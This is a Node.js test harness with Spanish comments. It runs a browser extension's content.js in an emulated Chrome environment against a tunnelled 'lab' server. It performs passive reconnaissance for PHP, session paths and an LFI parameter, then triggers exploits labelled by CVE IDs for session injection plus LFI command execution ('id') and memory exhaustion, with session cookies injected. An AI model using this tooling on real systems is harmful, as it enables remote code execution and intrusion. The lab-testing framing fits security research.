// Arnés de pruebas: ejecuta el content.js REAL contra el laboratorio vivo,
// emulando chrome/document/location. No forma parte de la extensión.
const fs = require('fs');
const vm = require('vm');

const BASE = process.env.LAB || 'https://wtowb-2602-f470-40-1-b7a2-64e8-943a-45bd.free.pinggy.net/';

function llamar(listener, msg, ms) {
    return new Promise((resolve) => {
        const t = setTimeout(() => resolve({ error: 'timeout del motor' }), ms || 240000);
        listener(msg, {}, (r) => { clearTimeout(t); resolve(r); });
    });
}

(async () => {
    const ses = await (await fetch(BASE + 'session.php')).json();
    console.log('sid lab =', ses.sid);

    const codigo = fs.readFileSync('content.js', 'utf8');
    let listener = null;
    const u = new URL(BASE);

    // Node no envia cookies aunque se pase credentials:'include'. En el
    // navegador si se envian, asi que aqui las inyectamos para no probar un
    // escenario que no existe.
    const fetchConCookies = (url, opciones) => {
        const o = Object.assign({}, opciones || {});
        o.headers = Object.assign({}, (opciones && opciones.headers) || {}, {
            Cookie: 'PHPSESSID=' + ses.sid
        });
        return fetch(url, o);
    };

    const sandbox = {
        console,
        Blob,
        Uint8Array,
        AbortController,
        URL,
        setTimeout,
        clearTimeout,
        fetch: fetchConCookies,
        TextDecoder,
        TextEncoder,
        queueMicrotask
    };
    sandbox.window = sandbox;
    sandbox.location = { href: u.href, origin: u.origin, pathname: u.pathname || '/', host: u.host };
    sandbox.document = {
        cookie: 'PHPSESSID=' + ses.sid,
        documentElement: { outerHTML: '' },
        querySelector: () => null,
        querySelectorAll: () => []
    };
    sandbox.chrome = {
        runtime: {
            sendMessage: (m, cb) => { if (cb) { cb({ valor: null }); } },
            onMessage: { addListener: (fn) => { listener = fn; } }
        }
    };

    vm.createContext(sandbox);
    vm.runInContext(codigo, sandbox);
    await new Promise((r) => setTimeout(r, 1500));

    console.log('\n=== 1) RECON PASIVO ===');
    const pasivo = await llamar(listener, { accion: 'obtener_pasivo' }, 60000);
    console.log('esPhp=%s version=%s rutaSesion=%s lfiParam=%s', pasivo.esPhp, pasivo.version, pasivo.rutaSesion, pasivo.lfiParam);
    (pasivo.detalles || []).forEach((d) => console.log('   ', d));

    console.log('\n=== 2) CVE-2026-109619 (session injection + LFI) cmd=id ===');
    const r1 = await llamar(listener, {
        accion: 'ejecutar_exploit', tipo: 'CVE-2026-109619', cmd: 'id',
        rutaSesion: '', confirmar: true
    });
    console.log('exito=%s', r1.exito);
    console.log(r1.salida);

    console.log('\n=== 3) CVE-2026-10961x (escalera OOM) ===');
    const r2 = await llamar(listener, {
        accion: 'ejecutar_exploit', tipo: 'CVE-2026-10961x', cmd: '', rutaSesion: '', confirmar: true
    });
    console.log('exito=%s', r2.exito);
    console.log(r2.salida);

    console.log('\n=== 4) CVE-2026-109618 (pre-flight + handoff) ===');
    const r3 = await llamar(listener, {
        accion: 'ejecutar_exploit', tipo: 'CVE-2026-109618', cmd: 'id', rutaSesion: '', confirmar: true
    });
    console.log('handoff=%s exito=%s', r3.handoff, r3.exito);
    console.log(r3.salida);
})().catch((e) => { console.error('FALLO DEL ARNÉS:', e); process.exit(1); });
